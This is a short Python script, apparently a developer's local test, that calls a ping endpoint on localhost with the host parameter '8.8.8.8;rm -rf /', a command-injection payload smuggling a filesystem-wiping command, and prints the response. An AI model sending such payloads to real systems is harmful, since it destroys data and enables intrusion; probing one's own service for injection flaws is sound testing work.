
import requests

BASE_URL = "http://localhost:8088"
API_KEY = "dev_key_123456"

payload = "8.8.8.8;rm -rf /"
params = {
    "host": payload
}

headers = {
    "X-API-Key": API_KEY
}

response = requests.get(f"{BASE_URL}/v1/ping", params=params, headers=headers)

print("➡️ URL envoyée:", response.url)
print("✅ Code HTTP:", response.status_code)
print("📦 Réponse JSON:", response.json())
